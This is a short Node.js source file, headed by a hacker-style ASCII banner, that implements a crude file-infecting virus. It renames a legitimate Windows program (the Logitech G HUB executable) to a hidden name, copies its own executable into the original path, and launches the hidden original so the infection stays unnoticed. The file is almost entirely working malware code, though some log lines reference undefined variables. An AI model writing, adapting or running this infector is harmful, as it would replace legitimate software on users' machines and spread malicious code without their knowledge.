/*
 ░▒        ╔╔════════════════════════════════════════════════╗╗              ▒█
 ▓█        ╚╗                                                ╔╝              ▒▓
 ░▒         ║        ░░░░▒▒▓█▌■CALLR··                       ║               ▒▓
 ▓█         ║                                                ║               ▒▓
 ░▒        ╔╝            l4m3 javascript garbage             ╚╗              ░▒
 ▓█        ╚╗          but still feeds on the weak           ╔╝              ▓█
 ░▒        ╔╝             like a hungry leopard              ╚╗              ░▒
 ▓█        ╚╗                                                ╔╝              ▓█
 ░▒         ║                      ≡quicksilv3r 2021≡        ║               ░▒
 ▒▓         ║╗                                              ╔║               █▓
 ▒▓         ╚╝╗╔═╗╔═╦═══╦═════════╦═══╦══════════╦═══╦═╗╔═╗╔╚╝               ▒░
 ▒▓           ╚╝ ╚╝ ╚═══╝         ╚═══╝          ╚═══╝ ╚╝ ╚╝                 █▓
 ░▒                                                                          ▒░
 */
const fs = require('fs');
const{ spawn } = require('child_process');

console.log('≡≡CALLR v0.0.9≡≡')
console.log('feeding time! Ç···■··')
console.log('muahahaha')

//let $callrExePath = "C:\\Program Files\\iNFekt\\infekt-win64.exe"
const $callrExePath = process.argv0;
const $targetFilePath = "C:\\Program Files\\LGHUB\\lghub.exe";
const $targetFilePathHidden = "C:\\Program Files\\LGHUB\\lghub.exe.blah";
// infect
fs.rename($targetFilePath, $targetFilePathHidden, (err) => {
    if (err) {
        console.log('ERROR: ' + err);
    } else {
        console.log("renamed " + $targetFilePath + " to " + $targetFilePathHidden);
        console.log(`process.argv0: ${process.argv0}`);
        console.log(`copying ${callrExePath} to ${targetFilePath}`);
        fs.copyFile($callrExePath, $targetFilePath, (err) => {
            if (err) {
                console.log("Error Found:", err);
            } else {
                console.log(`copied ${callrExePath} to ${targetFilePath}`);
            }            
        });
    }
});

// run host
const $hostFilePath = "C:\\Program Files\\iNFekt\\infekt-win64.exe.blah";
const $hostFilePathExe = "C:\\Program Files\\iNFekt\\infekt-win64.host.exe"
fs.rename($hostFilePath, $hostFilePathExe, function(err) {
    if ( err ) console.log(`fs.rename(${hostFilePath}, ${hostFilePathExe} ERROR: ${err}`);    
    console.log(`renamed ${hostFilePath} to ${hostFilePathExe}`);
    console.log('running ' + $hostFilePathExe);

    const hostProc = spawn($hostFilePathExe);
    hostProc.on('close', (code) => {
        console.log(`child process ${hostFilePathExe} exited with code ${code}`);
        fs.rename($hostFilePathExe, $hostFilePath, function(err) {
            if ( err ) console.log(`fs.rename(${hostFilePathExe}, ${hostFilePath} ERROR: ${err}`);    
            console.log(`renamed ${hostFilePathExe} to ${hostFilePath}`);
        });
    });
});